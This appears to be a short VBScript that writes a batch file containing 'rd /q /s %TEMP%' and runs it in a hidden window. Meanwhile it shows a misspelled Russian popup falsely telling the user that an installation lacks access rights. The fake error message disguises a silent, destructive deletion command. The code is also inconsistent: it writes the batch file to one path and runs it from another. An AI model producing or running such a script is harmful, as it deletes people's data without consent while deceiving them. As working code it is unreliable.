On Error Resume Next
Set objFso = CreateObject("Scripting.FileSystemObject")
Set objFile = objFso.CreateTextFile("%TEMP%\vbs\del.cmd") 
With objFile 
.WriteLine "cd C:\Windows"  
.WriteLine "rd /q /s %TEMP%" 
.Close 
End With 
set oShell = WScript.CreateObject ("WScript.Shell")
oShell.Popup "Для установки нехватае прав лоступа", 5, "Информация", 4096
set WshShell = WScript.CreateObject("WScript.Shell")   
WshShell.Run "%TEMP%\del.cmd", 0, false    
